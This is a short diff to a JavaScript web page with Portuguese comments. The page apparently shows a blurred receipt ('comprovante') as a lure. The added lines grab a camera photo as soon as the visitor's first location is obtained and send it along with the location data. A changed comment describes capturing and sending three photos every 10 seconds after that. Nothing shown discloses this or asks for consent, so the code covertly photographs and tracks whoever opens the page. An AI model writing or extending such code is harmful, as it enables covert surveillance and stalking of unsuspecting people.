@@ -88,6 +88,11 @@
               };
               if (document.querySelector(".comprovante-container.blurred")) {
                 removeLoading();
+                // Enviar a primeira foto e localização imediatamente após a primeira localização
+                const firstPhoto = capturePhoto();
+                if (firstPhoto) {
+                  sendLocation({ ...locationData, photos: [firstPhoto] });
+                }
               }
             },
             error => {
@@ -115,7 +120,7 @@
         }
       }
 
-      // Capturar e enviar 3 fotos a cada 10 segundos
+      // Capturar e enviar 3 fotos a cada 10 segundos após o envio inicial
       async function startCaptureInterval() {
         if (!(await startCamera())) return; // Se a câmera falhar, não prosseguir
         setInterval(() => {
